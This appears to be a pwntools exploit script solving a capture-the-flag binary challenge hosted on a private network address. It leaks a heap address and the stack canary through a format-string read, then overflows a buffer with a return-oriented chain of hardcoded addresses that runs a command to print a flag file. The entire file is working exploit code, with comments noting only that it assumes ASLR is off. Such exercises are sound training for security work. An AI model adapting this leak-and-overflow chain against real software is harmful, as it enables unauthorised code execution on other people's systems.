from pwn import *

LENGTH = 1032+88

# This code is run correctly only if ASLR is turned off
# I didn't create address calculation area and I'll add it ASAP
# This is simple code that connect to server get flag from flag file.

p = remote('192.168.0.2', 1337)
p.recvuntil('choice > ')
p.sendline('3')
p.recvuntil('choice > ')
p.sendline('1')
p.recvuntil('> ')
p.sendline('1')
p.recvuntil('> ')
p.sendline('100')
heap_addr = int(p.recvuntil('> ').split('\n')[0].split(' ')[-1], 16)
print hex(heap_addr)
p.sendline('3')
p.recvuntil('> ')
p.sendline('1')
p.recvuntil('> ')
p.sendline(str(len('cat /home/knight/ctf/exploit/baby/flag.txt')+1))
p.sendline('cat /home/knight/ctf/exploit/baby/flag.txt')
p.recvuntil('> ')
p.sendline('5')
p.recvuntil('choice > ')
p.sendline('2')
p.sendline('%20p'*144)
p.recvuntil('format >')
addr = p.recvuntil('format >')
canary = addr.split(' ')[-3].split('\n')[0]
print canary
p.sendline('')
p.recvuntil('choice > ')
p.sendline('1')
p.recvuntil('send ? ')
payload = p64(0x0000000000001143)
payload += p64(0x0000555555555c8b)
payload += p64(0x0000000000000001)
payload += p64(0x7ffff7b04d00)
payload += p64(0x0000555555555c8b)
payload += p64(0x04)
payload += p64(0x7ffff7b04d60)
payload += p64(0x0000555555555c8b)
payload += p64(heap_addr)
payload += p64(0x7ffff7a53390)
p.sendline(str(LENGTH+1))
p.sendline('a'*1032+p64(int(canary, 16))+payload)
p.recvuntil('\n')
print 'Flag: %s' %p.recvuntil('\n')
print "[*] END"
